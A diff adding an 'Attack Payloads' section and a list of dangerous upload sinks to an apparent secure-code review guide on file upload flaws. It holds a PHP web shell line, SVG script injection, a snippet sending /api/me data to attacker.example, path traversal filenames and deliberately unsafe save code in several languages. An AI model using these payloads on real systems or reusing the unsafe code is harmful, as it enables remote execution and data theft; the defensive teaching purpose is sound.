@@ -30,6 +30,109 @@ The unsafe assumption is that the client `Content-Type` or file extension reflec
 | **Active content** | SVG/HTML allowed as inline "images", user MIME echoed on download |
 | **AuthZ gaps** | Upload without matching download permission for other users' objects |
 
+## Attack Payloads
+
+Use these in authorized tests on upload endpoints. Abuse scenarios include web shells, stored XSS via SVG/HTML, and quota exhaustion.
+
+### Pattern 1: Web shell under web root (upload abuse scenario)
+
+```text
+Filename: shell.php.jpg or shell.jsp
+Content: <?php system($_GET['cmd']); ?>
+```
+
+Stored under `public/uploads/` and executed by the web server.
+
+### Pattern 2: Double extension and MIME mismatch
+
+```text
+report.pdf.exe
+image.png  (polyglot with HTML/script)
+Content-Type: image/jpeg  (client lie; body is HTML)
+```
+
+### Pattern 3: SVG and HTML active content
+
+```xml
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert(document.domain)</script>
+</svg>
+```
+
+```html
+<script>fetch('/api/me').then(r=>r.json()).then(d=>fetch('https://attacker.example/?'+btoa(JSON.stringify(d))))</script>
+```
+
+### Pattern 4: Path traversal in original filename
+
+```text
+filename=../../../static/evil.js
+```
+
+### Pattern 5: Oversized and zip bomb uploads
+
+```text
+10GB file or highly compressible blob to exhaust disk/RAM during scan
+```
+
+### Pattern 6: Content sniffing bypass
+
+```text
+GIF89a<?php ... ?>   # magic bytes + executable payload
+```
+
+## Language-Specific Sinks and Dangerous APIs
+
+Search for save paths, extension checks, and download handlers that trust client metadata.
+
+### Python
+
+```python
+file.save(os.path.join("static", file.filename))
+werkzeug secure_filename omitted
+return send_file(upload_path, mimetype=file.content_type)
+```
+
+Flask `request.files`; Django `FileField` saved to `MEDIA_ROOT` under web root.
+
+### Java
+
+```java
+part.write(uploadDir + File.separator + part.getSubmittedFileName());
+Files.copy(stream, Paths.get(publicDir, originalName));
+```
+
+Spring `MultipartFile.transferTo`; servlet `Part` without content sniffing.
+
+### C#
+
+```csharp
+file.CopyTo(Path.Combine(_webRoot, file.FileName));
+return PhysicalFile(path, file.ContentType);
+```
+
+`IFormFile` saved with client `FileName`; missing virus scan and size cap before buffer.
+
+### JavaScript (Node.js)
+
+```javascript
+const dest = path.join("public", req.file.originalname);
+fs.writeFileSync(dest, req.file.buffer);
+multer({ dest: "uploads/" })
+```
+
+### Go
+
+```go
+os.WriteFile(filepath.Join("static", header.Filename), data, 0644)
+```
+
+### Object storage
+
+```text
+s3.put_object(Key=user_key, ACL='public-read')  # user-controlled key under web bucket
+```
+
 ## Sample Vulnerable Code in Python
 
 ```python
